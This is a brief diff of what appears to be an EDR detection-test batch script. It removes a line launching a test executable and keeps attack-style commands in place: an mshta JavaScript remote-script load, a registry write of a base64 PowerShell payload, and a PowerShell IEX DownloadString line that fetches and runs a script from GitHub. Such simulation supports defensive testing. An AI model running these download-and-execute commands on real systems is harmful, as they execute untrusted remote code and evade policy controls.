@@ -5,7 +5,6 @@ mshta.exe javascript:a=(GetObject('script:#{https://raw.githubusercontent.com/re
 
 start /wait reg.exe add "HKEY_CURRENT_USER\Software\Classes\XSample" /v XXX /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2Nucm1hcmsudHh0IiAtdmFsdWUgInRhcmdldCI="
 
-start %temp%\EDRtestFile.exe
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
 
 
